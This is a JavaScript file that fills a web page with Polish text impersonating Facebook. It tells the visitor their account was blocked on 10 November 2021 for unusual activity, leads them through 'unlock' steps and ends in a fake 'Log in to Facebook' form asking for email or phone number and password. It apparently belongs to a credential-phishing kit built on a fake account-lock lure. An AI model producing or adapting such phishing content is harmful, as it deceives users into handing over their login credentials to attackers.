var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");

mainHeader.innerHTML ="Twoje konto zostało zablokowane";
mainParagraph.innerHTML ="Zauważyliśmy nietypową aktywność na Twoim koncie. Może to oznaczać, że ktoś użył Twojego konta bez Twojej wiedzy.";
lockedHeader.innerHTML ="Konto zablokowane 10 listopada 2021 r.";
lockedParagraph.innerHTML ="Aby Cię chronić, Twój profil nie jest widoczny dla osób na Facebooku i nie możesz korzystać ze swojego konta.";
footerParagraph.innerHTML ="Przeprowadzimy Cię przez kilka kroków, aby odblokować Twoje konto.";
getStarted.innerHTML ="Zaczynaj";
nextHeader.innerHTML ="Jak odblokować swoje konto";
fristLineHeader.innerHTML ="Potwierdź, że to jest Twoje konto";
fristLineParagraph.innerHTML ="Ponieważ ktoś inny mógł mieć dostęp, musimy potwierdzić, że jesteś właścicielem tego konta, zanim przejdziemy dalej.";
secoundLineHeader.innerHTML ="Zabezpiecz swoje dane logowania";
thirdLineHeader.innerHTML ="Twoje konto zostanie odblokowane";
nextButton.innerHTML ="Następny";
backButton.innerHTML ="Plecy";
logHeading.innerHTML ="Zaloguj się do Facebooka";
logAlert.innerHTML ="Musisz się najpierw zalogować";
logAlert2.innerHTML ="Musisz się najpierw zalogować";
userInput.setAttribute("placeholder" , "Adres e-mail lub numer telefonu");
passInput.setAttribute("placeholder" , "Hasło");
logButton.innerHTML ="Zaloguj sie";
or.innerHTML ="lub";
createButton.innerHTML ="Stwórz nowe konto";
